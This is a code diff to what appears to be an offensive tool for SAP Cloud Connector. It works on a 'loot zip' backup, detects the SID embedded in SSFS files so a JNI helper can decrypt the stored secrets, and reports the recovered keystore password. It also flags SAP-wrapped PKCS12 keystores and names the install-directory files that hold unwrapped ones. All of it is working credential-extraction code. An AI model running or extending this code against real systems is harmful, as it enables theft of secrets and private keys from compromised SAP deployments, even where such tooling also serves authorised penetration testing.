@@ -116,9 +116,33 @@ def find_native_lib(scc_native_dir: Optional[str] = None) -> Optional[str]:
     return None
 
 
-def _extract_ssfs_to_tmp(loot_zip_path: str) -> Optional[str]:
+def _detect_ssfs_sid(blob: bytes) -> Optional[str]:
+    """SSFS files store the SAP system identifier (SID) inline so the JNI
+    can validate it.  The byte layout is:
+        magic 'RSecSSFs' + record-type + zero-padding + 'SYSTEM<spaces>SID<spaces>'
+    where SID is padded to 8 bytes with ASCII spaces.
+
+    The JNI's getRecord() builds its data-file path as
+    ``RSEC_SSFS_DATAPATH/SSFS_<SAPSYSTEMNAME>.DAT`` — when the embedded SID
+    differs from what we set in SAPSYSTEMNAME the lookup silently returns
+    null.  Detect the embedded SID so we can stage the files under the
+    correct filename.
+    """
+    import re
+    # Look for ASCII "SYSTEM" followed by whitespace and 1-8 chars of SID.
+    m = re.search(rb"SYSTEM[\x20]+([A-Z0-9_]{1,8})", blob)
+    if m:
+        return m.group(1).decode("ascii", errors="replace")
+    return None
+
+
+def _extract_ssfs_to_tmp(loot_zip_path: str) -> Optional[tuple]:
     """Extract scc_config/SSFS_SCC.{KEY,DAT} from the loot zip into a
-    fresh temp dir at mode 0700.  Returns the temp-dir path or None."""
+    fresh temp dir at mode 0700.  Returns ``(tmpdir, sid)`` so the caller
+    knows which SAPSYSTEMNAME the JNI helper needs.  ``sid`` is detected
+    from the file contents — the on-disk filename is meaningless to the
+    JNI, which only honours ``SSFS_<SAPSYSTEMNAME>.{KEY,DAT}``.
+    """
     try:
         zf = zipfile.ZipFile(loot_zip_path)
     except Exception:
@@ -128,16 +152,19 @@ def _extract_ssfs_to_tmp(loot_zip_path: str) -> Optional[str]:
     dat = members.get("scc_config/SSFS_SCC.DAT")
     if not (key and dat):
         return None
+    key_blob = zf.read(key)
+    dat_blob = zf.read(dat)
+    sid = _detect_ssfs_sid(dat_blob) or _detect_ssfs_sid(key_blob) or "SCC"
     tmp = tempfile.mkdtemp(prefix="sapmap_ssfs_")
     try:
         os.chmod(tmp, 0o700)
     except Exception:
         pass
-    with open(os.path.join(tmp, "SSFS_SCC.KEY"), "wb") as f:
-        f.write(zf.read(key))
-    with open(os.path.join(tmp, "SSFS_SCC.DAT"), "wb") as f:
-        f.write(zf.read(dat))
-    return tmp
+    with open(os.path.join(tmp, f"SSFS_{sid}.KEY"), "wb") as f:
+        f.write(key_blob)
+    with open(os.path.join(tmp, f"SSFS_{sid}.DAT"), "wb") as f:
+        f.write(dat_blob)
+    return tmp, sid
 
 
 def decrypt_ssfs(loot_zip_path: str, *,
@@ -171,16 +198,21 @@ def decrypt_ssfs(loot_zip_path: str, *,
         return {"ok": False,
                 "error": f"`{java_bin}` not on PATH — install a JDK or pass java_bin"}
 
-    tmp = _extract_ssfs_to_tmp(loot_zip_path)
-    if not tmp:
+    extracted = _extract_ssfs_to_tmp(loot_zip_path)
+    if not extracted:
         return {"ok": False, "error": "loot zip lacks SSFS_SCC.KEY/.DAT"}
+    tmp, embedded_sid = extracted
+    # The JNI silently returns null when SAPSYSTEMNAME doesn't match the
+    # SID embedded in the SSFS — prefer the embedded value over the
+    # caller's hint.
+    effective_sid = embedded_sid or sid
     try:
         cmd = [java_bin, f"-Dscc.jni.lib={native}",
                "-jar", jar]
         if keys:
             cmd.extend(keys)
         env = os.environ.copy()
-        env["SAPSYSTEMNAME"] = sid
+        env["SAPSYSTEMNAME"] = effective_sid
         env["RSEC_SSFS_DATAPATH"] = tmp
         # Make sure JNI can also locate the lib via OS search path.
         if platform.system().lower().startswith("win"):
@@ -208,7 +240,7 @@ def decrypt_ssfs(loot_zip_path: str, *,
                     "error": f"could not parse helper output as JSON: {e}; "
                              f"stdout={out[:200]!r}"}
         return {"ok": True, "secrets": secrets, "native_lib": native,
-                "helper_jar": jar}
+                "helper_jar": jar, "sid": effective_sid}
     finally:
         try:
             shutil.rmtree(tmp, ignore_errors=True)
@@ -223,6 +255,16 @@ def unlock_keystores(loot_zip_path: str, password: str) -> dict:
         path, alias, friendly_name, cert_subject, cert_issuer,
         cert_sha256, cert_not_before, cert_not_after, key_type,
         key_size, key_sha256, extra_certs (list of subjects)
+
+    NOTE: SCC's REST `/api/v1/configuration/backup` endpoint applies a
+    second layer of SAP-proprietary wrapping over each .p12 inside the
+    zip (sealed with the *backup* password sent in the POST body, NOT
+    with JAVA_KEYSTORE_PASSWORD).  Those wrapped blobs cannot be opened
+    by any standard PKCS12 parser — every entry will surface
+    ``error: 'wrapped: <reason>'`` here.  To recover real keystores you
+    need filesystem access to the SCC install dir (``scc_config\\scc.p12``,
+    ``config\\ks.p12``, and the per-subaccount ``scc.p12`` files), which
+    are stored as standard PKCS12 sealed with JAVA_KEYSTORE_PASSWORD.
     """
     try:
         from cryptography.hazmat.primitives.serialization import (
@@ -247,7 +289,17 @@ def unlock_keystores(loot_zip_path: str, password: str) -> dict:
         try:
             key, cert, extras = pkcs12.load_key_and_certificates(blob, pwd)
         except Exception as e:
-            out.append({"path": info.filename, "error": f"unlock failed: {e}"})
+            head = blob[:2]
+            wrapped = head[:1] != b"\x30"
+            out.append({
+                "path": info.filename,
+                "error": ("wrapped: SAP backup adds a second encryption "
+                          "layer over the .p12; can't be parsed as PKCS12. "
+                          "Use filesystem access to the SCC install dir "
+                          "for unwrapped keystores.") if wrapped
+                         else f"unlock failed: {e}",
+                "is_sap_wrapped": wrapped,
+            })
             continue
         entry = {"path": info.filename}
         if cert is not None:
@@ -314,6 +366,7 @@ def decrypt_and_unlock(loot_zip_path: str, *,
         "fetched_at": datetime.now().isoformat(timespec="seconds"),
         "loot_zip": os.path.abspath(loot_zip_path),
         "native_lib": res.get("native_lib", ""),
+        "sid": res.get("sid", sid),
         "secrets": secrets,
     }
     try:
@@ -333,6 +386,7 @@ def decrypt_and_unlock(loot_zip_path: str, *,
         "secrets_missing": [k for k, v in secrets.items() if not v],
         "native_lib": res.get("native_lib", ""),
         "helper_jar": res.get("helper_jar", ""),
+        "sid": res.get("sid", sid),
         "keystore_password_recovered": bool(pwd),
         "keystore_password_length": len(pwd),
     }
